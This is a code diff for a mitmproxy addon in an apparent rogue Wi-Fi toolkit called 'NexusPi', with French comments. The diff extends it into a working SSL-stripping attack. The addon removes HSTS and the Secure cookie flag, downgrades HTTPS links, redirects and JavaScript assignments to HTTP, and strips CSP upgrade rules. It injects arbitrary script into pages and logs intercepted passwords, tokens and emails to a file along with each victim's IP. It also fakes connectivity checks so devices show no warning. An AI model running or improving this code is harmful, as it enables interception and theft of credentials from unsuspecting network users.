@@ -1,46 +1,73 @@
 """
-NexusPi — addon mitmproxy : injection HTML + SSL strip + captive probes.
+NexusPi — addon mitmproxy : sslstrip2 avancé + injection HTML + log creds.
 
 Chargé par mitmdump (mode mitm_https) avec :
     mitmdump --mode transparent --listen-port 8080 -s mitmproxy_inject.py
 
 Variables d'env (positionnées par wifi.py) :
     NEXUSPI_INJECT       JS à injecter avant </body> (vide = pas d'injection)
-    NEXUSPI_STRIP_HTTPS  "1" pour réécrire <a href="https://..."> en http://
-                         (attention HSTS : la plupart des grands sites résistent)
+    NEXUSPI_STRIP_HTTPS  "1" pour activer le SSLstrip2 complet :
+                         - Rewrite https → http dans <a>, <form>, <link>, <script>,
+                           <img>, <iframe>, Location header, meta refresh
+                         - Retire le header Strict-Transport-Security
+                         - Retire le flag Secure des cookies
+                         - Log les POST contenant des credentials
+    NEXUSPI_CRED_LOG     Chemin du fichier de log creds (TSV)
 
 Captive probes : on intercepte les checks de connectivité OS et on répond
 "OK" immédiatement → l'OS ne montre PAS le warning "pas d'internet".
 """
+import json
 import os
 import re
+import time
 
 INJECT_SCRIPT = (os.environ.get("NEXUSPI_INJECT") or "").strip()
 STRIP_HTTPS = os.environ.get("NEXUSPI_STRIP_HTTPS") == "1"
+CRED_LOG = os.environ.get("NEXUSPI_CRED_LOG", "")
 
 _INJECTION_BYTES = (
     f"<script>{INJECT_SCRIPT}</script>".encode("utf-8")
     if INJECT_SCRIPT else b""
 )
 
-_HTTPS_HREF_RE = re.compile(
-    rb'(<a\s[^>]*href\s*=\s*["\'])https://([^"\'\s>]+)',
+# ── SSLstrip2 : regex pour TOUS les attributs contenant https:// ──────────
+# Couvre <a href>, <form action>, <link href>, <script src>, <img src>,
+# <iframe src>, <meta content="...url=https://">, srcset, etc.
+_HTTPS_ATTR_RE = re.compile(
+    rb'((?:href|src|action|content|srcset|poster|data|formaction)'
+    rb'\s*=\s*["\'])'
+    rb'https://',
     re.IGNORECASE,
 )
 
-# Patterns de probes de connectivité par OS. Match large : si le path
-# CONTIENT le pattern (peu importe le host ou la query string), on répond.
-# Réponses attendues par chaque OS :
+# JS assignments : window.location = "https://..." etc.
+_HTTPS_JS_RE = re.compile(
+    rb'((?:window|document|self|top|parent)\.(?:location|href|src)'
+    rb'\s*=\s*["\'])'
+    rb'https://',
+    re.IGNORECASE,
+)
+
+# ── Détection des champs de credentials dans les POST ─────────────────────
+_CRED_FIELDS = {
+    "password", "passwd", "pass", "pwd", "mot_de_passe", "motdepasse",
+    "wifi_password", "wpa_password", "secret", "token",
+    "login", "username", "user", "email", "mail", "identifiant",
+    "google_password", "fb_password", "google_email", "fb_email",
+}
+
+# Patterns de probes de connectivité par OS
 _204_PATTERNS = (
-    "/generate_204",       # Android, Chrome (gstatic / clients[34] / google.cn / honor)
-    "/gen_204",            # variante Android
+    "/generate_204",
+    "/gen_204",
 )
 _APPLE_HTML_PATTERNS = (
-    "/hotspot-detect.html",        # iOS / macOS
-    "/library/test/success.html",  # macOS WiFi assist
+    "/hotspot-detect.html",
+    "/library/test/success.html",
 )
 _MS_PATTERNS = (
-    "/connecttest.txt",    # Windows NCSI
+    "/connecttest.txt",
     "/ncsi.txt",
 )
 _FIREFOX_PATTERNS = (
@@ -52,17 +79,35 @@ _APPLE_HTML = (b"<HTML><HEAD><TITLE>Success</TITLE></HEAD>"
                b"<BODY>Success</BODY></HTML>")
 
 
+def _log_creds(flow, data: dict):
+    """Log les credentials interceptés vers le fichier TSV partagé."""
+    if not CRED_LOG:
+        return
+    # Filtrer pour ne garder que les champs intéressants
+    cred_data = {}
+    for k, v in data.items():
+        if any(cf in k.lower() for cf in _CRED_FIELDS):
+            cred_data[k] = v
+    if not cred_data:
+        return
+    try:
+        host = flow.request.host or "?"
+        ip = flow.client_conn.peername[0] if flow.client_conn.peername else "?"
+        ua = flow.request.headers.get("user-agent", "?")
+        with open(CRED_LOG, "a", encoding="utf-8") as f:
+            f.write(f"{time.strftime('%Y-%m-%dT%H:%M:%S')}\t"
+                    f"{ip}\tMITM_CRED\t"
+                    f"{json.dumps({'host': host, **cred_data}, ensure_ascii=False)}\t"
+                    f"{ua}\n")
+    except Exception:
+        pass
+
+
 def request(flow):
-    """
-    Hook AVANT que mitmproxy contacte le serveur réel.
-    On intercepte les captive probes et on répond direct → 0 latence.
-    Match large : on regarde uniquement le path (stripé de la query),
-    ignore le host (couvre TOUS les domaines : gstatic, hihonor, google.cn, etc.)
-    """
+    """Hook AVANT que mitmproxy contacte le serveur réel."""
     if not flow.request:
         return
     path = (flow.request.path or "/").split("?")[0]
-    host = (flow.request.host or "").lower()
 
     from mitmproxy import http
 
@@ -98,12 +143,55 @@ def request(flow):
                 {"Content-Type": "text/html", "Connection": "close"})
             return
 
+    # ── Log credentials dans les POST ──────────────────────────────────
+    if flow.request.method == "POST":
+        try:
+            ctype = (flow.request.headers.get("content-type") or "").lower()
+            body = flow.request.get_text() or ""
+            data = {}
+            if "application/x-www-form-urlencoded" in ctype:
+                from urllib.parse import parse_qs
+                parsed = parse_qs(body)
+                data = {k: v[0] if v else "" for k, v in parsed.items()}
+            elif "application/json" in ctype:
+                data = json.loads(body) if body else {}
+            if data:
+                _log_creds(flow, data)
+        except Exception:
+            pass
+
 
 def response(flow):
-    """Hook après réception de la réponse : injection / strip."""
+    """Hook après réception de la réponse : SSLstrip2 + injection."""
     resp = getattr(flow, "response", None)
     if not resp:
         return
+
+    # ── SSLstrip2 : retirer les headers de sécurité ────────────────────
+    if STRIP_HTTPS:
+        # Supprimer HSTS → le navigateur n'imposera plus HTTPS
+        if "strict-transport-security" in resp.headers:
+            del resp.headers["strict-transport-security"]
+
+        # Retirer le flag Secure des cookies → cookies envoyés en HTTP aussi
+        cookies = resp.headers.get_all("set-cookie")
+        if cookies:
+            resp.headers.pop("set-cookie")
+            for c in cookies:
+                c_clean = re.sub(r';\s*[Ss]ecure', '', c)
+                resp.headers.add("set-cookie", c_clean)
+
+        # Rewrite Location: header (redirects 301/302/307/308)
+        location = resp.headers.get("location")
+        if location and location.startswith("https://"):
+            resp.headers["location"] = "http://" + location[8:]
+
+        # Rewrite Content-Security-Policy upgrade-insecure-requests
+        csp = resp.headers.get("content-security-policy")
+        if csp and "upgrade-insecure-requests" in csp.lower():
+            resp.headers["content-security-policy"] = re.sub(
+                r'upgrade-insecure-requests;?\s*', '', csp, flags=re.IGNORECASE)
+
     ctype = (resp.headers.get("content-type") or "").lower()
     if "text/html" not in ctype:
         return
@@ -111,11 +199,14 @@ def response(flow):
     if not body:
         return
 
-    # 1. SSL strip — rewrite <a href="https://..."> → http://
+    # ── SSLstrip2 dans le corps HTML ───────────────────────────────────
     if STRIP_HTTPS:
-        body = _HTTPS_HREF_RE.sub(rb'\1http://\2', body)
+        # Rewrite tous les attributs HTML contenant https://
+        body = _HTTPS_ATTR_RE.sub(rb'\1http://', body)
+        # Rewrite les assignments JS (window.location = "https://...")
+        body = _HTTPS_JS_RE.sub(rb'\1http://', body)
 
-    # 2. Injection JS avant </body>
+    # ── Injection JS avant </body> ─────────────────────────────────────
     if _INJECTION_BYTES:
         for tag in (b"</body>", b"</BODY>", b"</Body>"):
             if tag in body:
